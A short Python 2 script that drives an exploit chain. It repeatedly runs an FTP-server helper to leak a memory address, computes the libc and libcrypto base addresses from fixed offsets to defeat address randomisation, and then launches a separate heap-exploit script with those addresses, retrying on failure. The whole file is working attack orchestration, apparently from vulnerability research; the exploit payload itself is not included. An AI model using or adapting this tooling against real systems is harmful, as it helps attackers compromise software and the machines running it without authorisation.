import os
import time

leak_address = 0

def calc_libbase():
    with open('address.txt', 'rb') as f:
            leak_address = f.read()
    
    libc_base = int(leak_address) - 0x1e2d1 + 0x1fa000
    libcrypto_base = int(leak_address) - 0x1e2d1 + 0x39000
    print 'calc leaking address: libc=%x, libcrypto=%x \n' % (libc_base, libcrypto_base)
    
    return libc_base, libcrypto_base


if __name__ == "__main__":
    i = 0
    j = 0
    k = 0
    #log('Start ftp server', 'Enter q or Q to stop ftpServer...')
    while True:
        
        j = j + 1
        k = k + 1 
        localtime = time.asctime(time.localtime(time.time()))
        print 'start leaking %d, time %s ...' % (j,localtime)
        if os.path.exists('address.txt'):
            print 'address.txt is exists ...'
            os.system('rm address.txt')
            k = 0

        print 'start ftp server ...'
        if(k > 0 and k % 7 == 0):
            os.system('python ftp_server.py 103 1')  #restart the whad for each 7 fails
        else:
            os.system('python ftp_server.py 103 0')
        
        time.sleep(3)

        if os.path.exists('address.txt'):
            libc_base, libcrypto_base = calc_libbase()
            i = i + 1
            print ('Start exp attack %d' % i);
            os.system('python ../../heap_exp/expl.py ' + hex(libc_base) + ' ' + hex(libcrypto_base))
            print 'Process end.'
            time.sleep(5)







